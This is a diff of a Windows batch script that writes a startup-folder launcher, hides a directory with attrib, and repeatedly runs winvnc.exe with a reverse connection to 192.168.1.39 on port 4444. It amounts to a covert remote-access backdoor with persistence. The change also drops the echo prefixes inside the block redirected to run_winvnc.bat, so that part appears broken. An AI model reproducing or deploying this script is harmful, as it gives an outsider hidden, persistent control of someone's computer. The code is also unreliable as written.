@@ -13,10 +13,12 @@ REM Create the batch file for startup folder (startup_winvnc.bat)
 
 REM Create the batch file to run winvnc.exe (run_winvnc.bat)
 (
-  echo @echo off
-  echo start winvnc.exe -run
-  echo timeout /t 1 >nul
-  echo winvnc.exe -connect 192.168.1.39::4444
+  @echo off
+taskkill /im winvnc.exe /f
+timeout /t 1 >nul
+start winvnc.exe -run
+timeout /t 1 >nul
+winvnc.exe -connect 192.168.1.39::4444
 ) > "%script_dir%run_winvnc.bat"
 
 REM Check if both batch files exist in their respective locations
@@ -39,16 +41,9 @@ attrib +h "%script_dir%\..\.."
 REM Start winvnc.exe and wait for permissions
 start /min "" winvnc.exe -run
 
-REM Wait for winvnc.exe to have permissions (check every 2 seconds)
-:CheckPermissions
-echo Checking permissions for winvnc.exe...
-timeout /t 2 >nul
-tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
-if errorlevel 1 (
-  goto CheckPermissions
-) else (
-  echo winvnc.exe has permissions. Starting run_winvnc.bat...
-  call "%script_dir%run_winvnc.bat"
-)
+timeout /t 7 >nul
 
+call "%script_dir%run_winvnc.bat"
+timeout /t 2 >nul
+call "%script_dir%run_winvnc.bat"
 REM End of main.bat
